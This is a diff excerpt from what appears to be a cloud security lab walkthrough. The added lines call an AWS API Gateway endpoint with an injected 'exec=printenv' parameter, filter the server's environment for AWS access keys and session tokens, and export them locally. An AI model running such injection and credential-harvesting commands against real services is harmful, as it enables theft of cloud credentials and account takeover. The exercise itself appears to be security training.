@@ -188,7 +188,13 @@ x-amzn-RequestId: 24d2e182-d961-474e-9e89-8bef9a530d05
 export AWS_ACCESS_KEY_ID=
 export AWS_SECRET_ACCESS_KEY=
 export AWS_SESSION_TOKEN=
+
+export API_ENDPOINT="https://vu1yq6qdp1.execute-api.us-west-2.amazonaws.com/dev"
+curl -s "$API_ENDPOINT/date?exec=printenv" | jq -r '.output | split("\n") | map(select(startswith("AWS_ACCESS_KEY_ID=") or startswith("AWS_SECRET_ACCESS_KEY=") or startswith("AWS_SESSION_TOKEN="))) | .[]' | while IFS= read -r line; do export $line; done
+
+
 ```
+
 
 The run below mentioned commands, make sure aws cli is installed:
 
